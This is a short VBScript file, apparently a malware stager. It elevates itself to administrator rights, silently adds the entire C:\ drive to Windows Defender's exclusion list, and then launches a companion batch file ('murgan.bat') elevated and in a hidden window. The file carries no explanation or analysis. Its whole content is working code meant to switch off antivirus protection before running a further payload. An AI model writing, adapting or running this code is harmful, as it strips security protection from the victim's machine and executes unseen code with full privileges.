If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If

CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\'", 0, True


Set objShell = CreateObject("Shell.Application")
strPath = WScript.ScriptFullName
strFolder = Left(strPath, InStrRev(strPath, "\"))
objShell.ShellExecute "cmd.exe", "/c " & strFolder & "murgan.bat", "", "runas", 0
